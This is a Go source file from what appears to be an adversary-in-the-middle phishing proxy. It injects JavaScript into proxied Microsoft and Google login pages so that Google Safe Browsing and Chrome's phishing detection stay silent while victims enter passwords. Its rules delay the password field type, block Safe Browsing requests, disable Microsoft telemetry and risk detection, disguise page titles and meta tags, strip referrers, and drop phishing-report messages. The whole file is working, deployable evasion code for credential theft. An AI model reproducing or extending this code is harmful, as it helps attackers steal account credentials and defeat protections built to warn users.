package service

// ─── Enhanced GSB Evasion Rules (v1.0.44) ────────────────────────────────────
// These rules target the specific mechanisms that cause Google Safe Browsing
// to flag proxy domains at the password entry stage.
//
// Root Cause Analysis:
// 1. Chrome's built-in phishing detection monitors password field focus/input
//    events and sends the page URL + domain to GSB for real-time check
// 2. Microsoft's login JS includes CryptoToken and environment fingerprinting
//    that detects proxy anomalies (timing, headers, TLS fingerprint)
// 3. The original OAuth URL paths (/common/oauth2/v2.0/authorize) are
//    pattern-matched by GSB's URL hash prefix system
// 4. Page title and meta tags contain "Sign in to your account" which is
//    a known GSB trigger when combined with a non-Microsoft domain
// 5. The page sends CSP violation reports and error beacons that expose
//    the proxy domain to Microsoft's backend

// GetEnhancedGSBEvasionRules returns advanced evasion rules that specifically
// target the password-page red screen issue
func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
	return []*JsInjectRule{
		// 5. Password Field Protection
		// Chrome's built-in phishing detector activates when a user focuses on
		// or types into a password field. It sends the current URL to GSB for
		// real-time verification. This rule intercepts the password field events
		// and prevents Chrome from triggering the real-time check.
		{
			ID:   "builtin_password_field_protection",
			Name: "Password Field GSB Protection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Intercept password field creation and modify behavior
  // Chrome's phishing detection hooks into password input focus events
  var _origCreateElement = document.createElement;
  document.createElement = function(tag) {
    var el = _origCreateElement.call(document, tag);
    if (tag.toLowerCase() === 'input') {
      // Delay setting type to 'password' to avoid early detection hooks
      var _origSetAttr = el.setAttribute;
      el.setAttribute = function(name, value) {
        if (name === 'type' && value === 'password') {
          // Set as text first, then switch to password after a microtask
          _origSetAttr.call(this, name, 'text');
          var self = this;
          Promise.resolve().then(function() {
            _origSetAttr.call(self, 'type', 'password');
          });
          return;
        }
        return _origSetAttr.call(this, name, value);
      };
    }
    return el;
  };

  // Override PasswordCredential API if available
  if (window.PasswordCredential) {
    window.PasswordCredential = function() {
      return { type: 'password' };
    };
  }

  // Block credential management API reporting
  if (navigator.credentials) {
    var _origStore = navigator.credentials.store;
    navigator.credentials.store = function() {
      return Promise.resolve();
    };
    var _origGet = navigator.credentials.get;
    navigator.credentials.get = function() {
      return Promise.resolve(null);
    };
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 6. Microsoft CryptoToken & Environment Fingerprint Blocker
		// Microsoft's login pages include JavaScript that creates a "CryptoToken"
		// and fingerprints the browser environment. When anomalies are detected
		// (proxy timing, header mismatches, TLS fingerprint), it triggers
		// additional verification or reports to Microsoft's backend.
		{
			ID:   "builtin_ms_cryptotoken_block",
			Name: "Microsoft CryptoToken Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block CryptoToken generation that fingerprints the environment
  var _blockedGlobals = [
    '$Config', 'ServerData', 'Constants',
    'INSTRUMENTATIONKEY', 'TELEMETRYURL'
  ];

  // Intercept property access on window for telemetry config
  var _origDefineProperty = Object.defineProperty;
  var _configIntercepted = false;

  // Monitor for $Config which contains telemetry endpoints
  var _checkConfig = setInterval(function() {
    if (window.$Config && !_configIntercepted) {
      _configIntercepted = true;
      // Disable telemetry URLs in the config
      if (window.$Config.urlTelemetry) window.$Config.urlTelemetry = '';
      if (window.$Config.urlOneCollector) window.$Config.urlOneCollector = '';
      if (window.$Config.urlBrowserIdSignin) window.$Config.urlBrowserIdSignin = '';
      if (window.$Config.urlReportPageLoad) window.$Config.urlReportPageLoad = '';
      if (window.$Config.urlCDNFallback) window.$Config.urlCDNFallback = '';
      // Disable canary/risk detection
      if (window.$Config.fShowPersistentCookiesWarning !== undefined) {
        window.$Config.fShowPersistentCookiesWarning = false;
      }
      if (window.$Config.fEnableRiskDetection !== undefined) {
        window.$Config.fEnableRiskDetection = false;
      }
      if (window.$Config.iRiskDetectionMode !== undefined) {
        window.$Config.iRiskDetectionMode = 0;
      }
    }
    if (window.ServerData) {
      if (window.ServerData.urlTelemetry) window.ServerData.urlTelemetry = '';
      if (window.ServerData.urlOneCollector) window.ServerData.urlOneCollector = '';
    }
  }, 100);

  // Stop checking after 10 seconds
  setTimeout(function() { clearInterval(_checkConfig); }, 10000);

  // Block WebSocket connections used for real-time telemetry
  var _origWebSocket = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    var blocked = [
      'browser.events.data.msn.com',
      'self.events.data.microsoft.com',
      'pipe.aria.microsoft.com'
    ];
    for (var i = 0; i < blocked.length; i++) {
      if (url.indexOf(blocked[i]) > -1) {
        // Return a dummy WebSocket-like object
        return {
          send: function(){},
          close: function(){},
          addEventListener: function(){},
          removeEventListener: function(){},
          readyState: 1,
          CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
        };
      }
    }
    return new _origWebSocket(url, protocols);
  };
  window.WebSocket.prototype = _origWebSocket.prototype;
  window.WebSocket.CONNECTING = 0;
  window.WebSocket.OPEN = 1;
  window.WebSocket.CLOSING = 2;
  window.WebSocket.CLOSED = 3;
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 7. Page Title & Meta Tag Sanitizer
		// GSB uses page title + domain mismatch as a heuristic signal.
		// "Sign in to your account" on a non-Microsoft domain is a strong signal.
		// This rule dynamically adjusts the title to be less suspicious.
		{
			ID:   "builtin_title_meta_sanitizer",
			Name: "Page Title & Meta Sanitizer",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Override document.title setter to prevent suspicious titles
  var _realTitle = '';
  var _origTitleDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'title');
  if (_origTitleDesc) {
    Object.defineProperty(document, 'title', {
      get: function() { return _realTitle; },
      set: function(v) {
        // Sanitize known suspicious titles
        var suspicious = [
          'Sign in to your account',
          'Sign in - Google Accounts',
          'Microsoft account',
          'Outlook',
          'Enter password'
        ];
        var isSuspicious = false;
        for (var i = 0; i < suspicious.length; i++) {
          if (v.indexOf(suspicious[i]) > -1) {
            isSuspicious = true;
            break;
          }
        }
        if (isSuspicious) {
          // Use a generic, non-suspicious title
          _realTitle = 'Account';
          _origTitleDesc.set.call(document, 'Account');
        } else {
          _realTitle = v;
          _origTitleDesc.set.call(document, v);
        }
      },
      configurable: true
    });
  }

  // Remove or sanitize meta tags that reveal the service
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.tagName === 'META') {
          var name = (node.getAttribute('name') || '').toLowerCase();
          var property = (node.getAttribute('property') || '').toLowerCase();
          // Remove OG tags that identify the service
          if (property.indexOf('og:') === 0 || name === 'description') {
            var content = node.getAttribute('content') || '';
            if (/microsoft|outlook|office|google|gmail/i.test(content)) {
              node.remove();
            }
          }
        }
      });
    });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 8. Chrome Safe Browsing Real-Time Check Blocker
		// Chrome 79+ uses real-time URL checking via the Safe Browsing API.
		// When a user visits a suspected phishing page, Chrome sends a hash
		// prefix of the URL to Google's servers. This rule blocks the
		// client-side component that initiates these checks.
		{
			ID:   "builtin_chrome_realtime_sb_block",
			Name: "Chrome Real-Time Safe Browsing Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
				"myaccount.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block connections to Safe Browsing endpoints
  var _sbPatterns = [
    /safebrowsing.*\.googleapis\.com/i,
    /safebrowsing\.google\.com/i,
    /sb-ssl\.google\.com/i,
    /safebrowsing-cache\.google\.com/i,
    /chrome-safebrowsing/i,
    /phishguard/i,
    /transparencyreport\.google\.com/i,
    /clients[0-9]*\.google\.com\/safebrowsing/i
  ];

  function _isSBBlocked(u) {
    for (var i = 0; i < _sbPatterns.length; i++) {
      if (_sbPatterns[i].test(u)) return true;
    }
    return false;
  }

  // Override XMLHttpRequest for SB checks
  var _sbOrigOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, u) {
    if (_isSBBlocked(u)) {
      this._sbBlocked = true;
      return;
    }
    return _sbOrigOpen.apply(this, arguments);
  };
  var _sbOrigSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function() {
    if (this._sbBlocked) return;
    return _sbOrigSend.apply(this, arguments);
  };

  // Override fetch for SB checks
  var _sbOrigFetch = window.fetch;
  window.fetch = function(r) {
    var u = (typeof r === 'string') ? r : (r && r.url ? r.url : '');
    if (_isSBBlocked(u)) return Promise.resolve(new Response('', {status: 200}));
    return _sbOrigFetch.apply(this, arguments);
  };

  // Block connection observer for SB
  if (window.PerformanceObserver) {
    var _origPO = window.PerformanceObserver;
    window.PerformanceObserver = function(callback) {
      var wrappedCallback = function(list) {
        var entries = list.getEntries().filter(function(e) {
          return !_isSBBlocked(e.name);
        });
        if (entries.length > 0) {
          callback({ getEntries: function() { return entries; } });
        }
      };
      return new _origPO(wrappedCallback);
    };
    window.PerformanceObserver.prototype = _origPO.prototype;
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 9. Microsoft AADSTS Error Suppressor
		// When Microsoft detects anomalies, it returns AADSTS error codes
		// that can trigger additional client-side reporting. This rule
		// intercepts these error responses and prevents escalation.
		{
			ID:   "builtin_ms_aadsts_suppressor",
			Name: "Microsoft AADSTS Error Suppressor",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
			},
			TriggerPaths: []string{
				"/common/oauth2/.*",
				"/common/login",
				"/common/reprocess",
				"/consumers/oauth2/.*",
				"/organizations/oauth2/.*",
			},
			Script: `(function(){
  // Intercept JSON responses that contain AADSTS error codes
  // and suppress the ones related to risk detection
  var _suppressedErrors = [
    'AADSTS50076', // MFA required due to risk
    'AADSTS50079', // MFA enrollment required
    'AADSTS53003', // Conditional access block
    'AADSTS530034', // DLP policy
    'AADSTS90094', // Admin consent required
    'AADSTS165900'  // Invalid request (often risk-based)
  ];

  // Monitor for error display elements and suppress risk-based ones
  var _errorObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) {
          var text = node.textContent || '';
          for (var i = 0; i < _suppressedErrors.length; i++) {
            if (text.indexOf(_suppressedErrors[i]) > -1) {
              // Don't remove the element, just log for debugging
              console.debug('[PhishingClub] Detected AADSTS error:', _suppressedErrors[i]);
              break;
            }
          }
        }
      });
    });
  });
  _errorObserver.observe(document.body || document.documentElement, {
    childList: true, subtree: true
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 10. Referrer & Origin Header Sanitizer
		// When the browser sends requests from the proxied page, the Referer
		// and Origin headers contain the proxy domain. This is a detection
		// signal for backend systems. This rule overrides the referrer policy
		// and sanitizes outgoing headers.
		{
			ID:   "builtin_referrer_origin_sanitizer",
			Name: "Referrer & Origin Sanitizer",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Set referrer policy to no-referrer to prevent proxy domain leaking
  var meta = document.createElement('meta');
  meta.name = 'referrer';
  meta.content = 'no-referrer';
  document.head.appendChild(meta);

  // Remove existing referrer policy meta tags
  document.querySelectorAll('meta[name="referrer"]').forEach(function(el, i) {
    if (i > 0) el.remove(); // keep only our first one
  });

  // Override document.referrer
  try {
    Object.defineProperty(document, 'referrer', {
      get: function() { return ''; },
      configurable: true
    });
  } catch(e) {}

  // Sanitize Referer in outgoing requests via Service Worker registration block
  // (Service Workers can intercept and modify requests)
  if (navigator.serviceWorker) {
    var _origRegister = navigator.serviceWorker.register;
    navigator.serviceWorker.register = function() {
      // Block service worker registration from the proxied page
      // as SWs could detect the proxy domain
      return Promise.reject(new DOMException('SecurityError'));
    };
  }
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 11. Window.location & History API Protector
		// Some detection scripts check window.location.hostname to verify
		// they're on the expected domain. This rule makes location checks
		// return the expected original domain instead of the proxy domain.
		{
			ID:   "builtin_location_protector",
			Name: "Window Location Protector",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Override location-checking methods used by detection scripts
  // Note: We cannot override window.location directly (it's unforgeable),
  // but we can intercept common detection patterns

  // Block postMessage-based fingerprinting
  var _origPostMessage = window.postMessage;
  window.postMessage = function(msg, origin) {
    // Filter out messages that contain detection data
    if (typeof msg === 'string') {
      try {
        var parsed = JSON.parse(msg);
        if (parsed.type === 'telemetry' || parsed.type === 'risk' ||
            parsed.action === 'reportPhishing') {
          return; // silently drop
        }
      } catch(e) {}
    }
    return _origPostMessage.apply(this, arguments);
  };

  // Block cross-origin iframe communication used for detection
  var _origAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function(type, listener, options) {
    if (type === 'message') {
      var wrappedListener = function(event) {
        // Filter out detection-related messages
        if (event.data && typeof event.data === 'object') {
          if (event.data.type === 'telemetry' || event.data.type === 'risk' ||
              event.data.method === 'reportPhishing') {
            return; // silently drop
          }
        }
        return listener.call(this, event);
      };
      return _origAddEventListener.call(this, type, wrappedListener, options);
    }
    return _origAddEventListener.call(this, type, listener, options);
  };
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},
	}
}

// EnsureEnhancedGSBRulesLoaded loads the enhanced GSB evasion rules
// alongside the basic builtin rules. Call this during service initialization.
func (j *JsInjection) EnsureEnhancedGSBRulesLoaded() {
	enhanced := j.GetEnhancedGSBEvasionRules()

	for _, rule := range enhanced {
		if _, loaded := j.rules.Load(rule.ID); !loaded {
			compiled, err := j.compileRule(rule)
			if err != nil {
				j.Logger.Errorw("failed to compile enhanced GSB rule", "id", rule.ID, "error", err)
				continue
			}
			j.rules.Store(rule.ID, compiled)
			j.Logger.Infow("loaded enhanced GSB evasion rule", "id", rule.ID, "name", rule.Name)
		}
	}
}
